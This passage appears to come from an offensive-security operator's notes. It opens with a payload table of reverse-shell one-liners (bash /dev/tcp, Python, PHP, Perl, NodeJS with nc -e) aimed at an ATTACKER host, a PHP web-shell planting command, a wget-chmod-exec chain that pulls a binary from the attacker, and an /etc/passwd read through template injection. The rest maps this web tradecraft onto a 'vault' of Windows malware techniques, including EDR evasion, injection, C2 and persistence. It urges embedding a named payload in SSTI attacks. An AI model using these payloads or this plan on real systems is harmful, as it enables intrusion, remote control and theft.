| `{{read '/etc/passwd'}}` | Handlebars file read (with handlebars-helpers) | Requires server-side rendering |
| `bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'` | Bash reverse shell (wrapped) | Wrap for bad char mitigation |
| `python -c 'import socket,subprocess,os;...'` | Python reverse shell one-liner | `www-data` context typically |
| `php -r '$sock=fsockopen(...);system("/bin/sh -i <&3 >&3 2>&3");'` | PHP reverse shell one-liner (5 variants) | Choose `exec`/`shell_exec`/`system`/`passthru`/`popen` based on hardening |
| `perl -e 'use Socket;...'` | Perl reverse shell one-liner | Often root in misconfigured Docker |
| `echo "require('child_process').exec('nc -nv ATTACKER 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js` | NodeJS two-stage reverse shell | Two requests; lower detection |
| `echo "<pre><?php passthru(\$_GET['cmd']); ?></pre>" > /var/www/html/webshell.php` | PHP web shell planting | High IoC; staging only |
| `wget http://ATTACKER/nc -O /var/tmp/nc ; chmod 755 /var/tmp/nc ; /var/tmp/nc -nv ATTACKER 9090 -e /bin/bash` | wget + chmod + exec chained payload | Three commands; URL-encode all |

## Gaps & Extensions

### Vault covers (not in this training)

- **Windows-native tradecraft**: The vault is Windows-only (NT API, PEB, syscalls, NTDLL, ETW, AMSI). This training is Linux/web-stack. No overlap in OS primitives.
- **EDR evasion post-foothold**: Vault `T016` covers AMSI/ETW patching, stack spoofing, PEB unlink, NTDLL unhook, ACG, handle blocking. This training ends at reverse shell — no EDR/evasion content.
- **Process injection / hollowing / ghosting**: Vault `T007-T015` cover 15 Windows injection methods. This training has no injection content.
- **Sleep obfuscation**: Vault `T005` (Ekko ROP) is Windows-specific. No equivalent here.
- **Polymorphic persistence**: Vault `T017` (5-layer) and `T018` (Edo Tensei resurrection) far exceed the web shell taught here.
- **C2 protocol**: Vault `T022` defines a binary protocol with 40+ message types and malleable C2 profiles. This training stops at `nc` listener.
- **Cryptocurrency-based dead drop C2**: Vault `T019` covers Sepolia contract + rentry.co discovery. No equivalent here.

### Training covers (not in vault or under-covered in vault)

- **SSTI as initial access vector**: Not covered in vault. The vault's `T022 transport.rs` handles payload acquisition (embed vs remote) but assumes the operator already has a delivery channel. SSTI is one such delivery channel — `dark_crystal` could be embedded into a Twig `reduce` payload or a Freemarker `Execute?new()` payload.
- **Linux reverse shell one-liners**: Not in vault (Windows-only). Useful for hybrid engagements.
- **Blocklist bypass tradecraft** (`$()` null statement, base64 wrap): Not in vault. Conceptually similar to `T021` shellcode encoding but applied to ASCII command strings, not shellcode.
- **Time-based blind confirmation**: The vault's `T005` Ekko ROP Sleep uses timing obfuscation but not as a confirmation side-channel.
- **Capability enumeration via `which` + Wfuzz**: The vault's `T023 byakugan.rs` does network recon (ARP/TCP/AD enum) but not host binary inventory. The vault's `T020 kaguya.rs` does LOtL inventory + EDR detection — more advanced but Windows-only.
- **Web shell planting**: The vault's `T017` persistence is far more advanced but doesn't include a web-shell primitive — operators on web-app engagements need this for the staging-to-pivot transition.
- **Type-coercion fingerprinting for templating engines**: Pure web-stack tradecraft, absent from vault.

### Training's supersession vs. vault

- The training's reverse shell one-liners are the *nix analog of `T022 winhttp_dl.rs` — but the vault's version is more OPSEC-aware (uses WinHTTP API directly, no `wget.exe` dependency, integrates with malleable C2 profiles via `T022 henge.rs`). Operators should prefer the vault's pattern on Windows; this training's pattern on Linux.
- The training's base64 wrap bypass is the ASCII analog of `T021` shellcode encoders — but the vault's encoders (IPv4/IPv6/MAC/UUID/words) produce innocuous-looking data structures, while base64 is a known malicious pattern in mature WAFs/EDRs.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| Twig `reduce` filter → `system()` RCE | T022 henge.rs (malleable C2 profile) | Both encode payload into host-language shape (template vs profile) to evade signature detection |
| Freemarker `?new()` class instantiation | T014 NtCreateUserProcess | Both reach privileged primitive via unconventional constructor path bypassing user-facing API |
| Pug `global.process.mainModule.require` pivot | T004 PEB Walker (gs:[0x60]) | Both reach privileged resolution primitive by walking internal structure when normal API is restricted |
| Jinja `{{config\|pprint}}` secret exfil | T021 build.rs .env embedding | Both expose secrets via misconfigured runtime/build config |
| Handlebars `handlebars-helpers` dangerous helpers | architecture/dependency-map.md | Both expand attack surface via third-party code exposing primitives core engine restricts |
| Halo CMS authenticated theme editor SSTI | T017 COM hijack persistence | Both abuse admin-reachable config store to plant attacker code in privileged context |
| Craft CMS blind SSTI OOB exfil via `curl` | T019 edo-dead-drop (Google Translate / Sepolia / steganography) | Both exfil through indirect app-logged-but-not-app-displayed channel |
| Craft CMS OOB HTTP callback | T019 discovery.rs (rentry.co + Sepolia contract discovery) | Vault's version is more advanced OOB confirmation pattern |
| OS command injection chaining operators | T022 winhttp_dl.rs + tcp_transport.rs | Linux/web analog of vault's staged payload delivery |
| Bash reverse shell `bash -i >& /dev/tcp/...` | T022 runner.rs multi-phase runner | Both separate payload acquisition from execution for OPSEC |
| `bash -c '...'` bad char wrap | T021 shellcode encoders (IPv4/IPv6/MAC/UUID/words) | Both encode payload to evade signature/blocklist; vault's encoders are for shellcode, this for ASCII |
| `$()` null-statement blocklist bypass | T006 Phantom Stubs (MEM_IMAGE-backed syscall stubs) | Both evade signature matching by inserting semantically-null but syntactically-valid content |
| Base64 wrap bypass | T021 crypto-obfuscation shellcode encoding | Direct parallel; both encode payload to benign-looking representation decoded by target |
| Blind time-based `sleep` confirmation | T020 anti-analysis API hammering (3M FPU/SIMD) | Both use measurable timing side-channel when output suppressed |
| Blind time-based confirmation | T005 ekko-rop-sleep | Timing as observable for execution confirmation |
| Capability enumeration via `which` + Wfuzz | T023 byakugan.rs (ARP/TCP/AD recon) | Linux/web analog of vault's network recon stage |
| Capability enumeration | T020 kaguya.rs (LOtL inventory + EDR detection) | Vault's version is more advanced (adds EDR detection); Windows-only |
| Reverse shell one-liner delivery | T022 winhttp_dl.rs (WinHTTP staged download) | Linux analog of vault's Windows payload delivery |
| PHP `passthru($_GET['cmd'])` web shell | T017 Five-Layer Persistence | Web shell is layer-0 (no resilience); vault is layer-5 with resilience monitor |
| Perl `open(STDIN,">&S")` descriptor dup | T007 process-injection handle duplication | Unix analog of Windows handle duplication for IPC |
| NodeJS two-stage (write file → exec) | T022 runner.rs multi-phase 0-6+ | Both separate payload acquisition from execution |
| OpenNetAdmin default creds → authenticated injection | T017 UAC bypass | Both abuse authenticated access to reach privileged primitive |
| Type-coercion fingerprinting (5*"5") | (no equivalent) | Pure web-stack tradecraft, absent from vault |
| SSTI as initial access vector | (no equivalent — T022 transport.rs assumes delivery channel) | Operator should integrate: `dark_crystal` payload embedded into Twig/Freemarker SSTI payload |